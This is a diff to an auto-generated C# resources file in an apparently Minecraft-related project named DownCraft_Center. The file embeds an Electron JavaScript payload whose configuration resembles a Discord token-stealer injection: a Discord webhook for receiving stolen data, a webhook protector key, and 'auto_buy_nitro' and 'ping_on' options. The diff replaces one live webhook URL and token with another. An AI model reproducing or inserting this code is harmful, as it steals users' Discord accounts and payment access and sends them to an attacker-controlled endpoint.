@@ -189,10 +189,10 @@ namespace DownCraft_Center.Properties {
         ///const { BrowserWindow, session } = require(&apos;electron&apos;);
         ///
         ///const config = {
-        ///  webhook: &apos;https://discordapp.com/api/webhooks/1046213703462310051/0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD&apos;,
-        ///  webhook_protector_key: &apos;0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD&apos;,
+        ///  webhook: &apos;https://discord.com/api/webhooks/1056170323315281990/uQm8q__HAq_BLr5ZgowXNQ6qbYE556PqYQ2oVsQI4oCH1n57lxVRL9CpWpK1qqA2Pth3&apos;,
+        ///  webhook_protector_key: &apos;uQm8q__HAq_BLr5ZgowXNQ6qbYE556PqYQ2oVsQI4oCH1n57lxVRL9CpWpK1qqA2Pth3&apos;,
         ///  auto_buy_nitro: false, 
-        ///  ping [le reste de la chaîne a été tronqué]&quot;;.
+        ///  ping_on [le reste de la chaîne a été tronqué]&quot;;.
         /// </summary>
         internal static string index {
             get {
